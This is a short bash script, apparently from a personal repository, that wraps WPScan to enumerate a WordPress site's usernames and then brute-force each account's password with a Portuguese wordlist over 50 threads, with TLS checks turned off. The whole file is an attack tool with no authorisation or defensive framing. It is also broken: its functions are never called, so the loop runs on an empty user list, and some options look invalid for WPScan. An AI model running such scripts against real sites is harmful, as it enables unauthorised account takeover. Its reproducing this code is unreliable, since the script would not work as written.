#!/bin/bash

# Author: meepmaster
# Date: 06-04-2024
# Description: WPSCAN SCRIPT SIMPLE

# Imput Url

function imput_url() {
    read -p "Enter the URL of the website: " website_url
}

# Perform user enumeration

function user_enumeration () {
    echo "Performing user enumeration..."
    wpscan --url "$website_url" --enumerate u > user_enum.txt
    # Extract usernames from the user enumeration result
    USERLIST=$(grep 'Username:' user_enum.txt | awk '{print $2}')
} 


# Perform brute force attack for each username

    for USERNAME in $USERLIST; do
        echo "Performing brute force attack for user: $USERNAME..."
        wpscan --url "$website_url" --passwords "/home/meepmaster/scripts/github/wpscanmeepscript/wordlist/portuguese_a-z_-_no_special_chars.txt" --user "$USERNAME" --max-threads 50 --disable-tls-checks --max-retries 3 --retry-connrefused --output "brute_force_result_$USERNAME.txt"
    done